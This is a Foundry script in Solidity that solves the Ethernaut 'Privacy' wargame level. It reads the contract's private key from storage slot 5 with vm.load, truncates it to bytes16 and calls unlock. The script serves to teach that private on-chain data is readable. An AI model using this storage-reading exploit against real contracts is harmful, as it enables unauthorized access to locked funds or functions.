// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {Privacy} from "./Problem.sol";

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        Privacy privacy = Privacy(_instanceAddress);

        uint256 storageIndex = 5;
        bytes32 data = vm.load(_instanceAddress, bytes32(storageIndex));
        bytes16 converted = bytes16(bytes32(data));

        vm.startBroadcast();
        privacy.unlock(converted);
        vm.stopBroadcast();

        assert(!privacy.locked());
    }

    function getLevelAddress() internal view override returns (address) {
        return 0x11343d543778213221516D004ED82C45C3c8788B;
    }
}
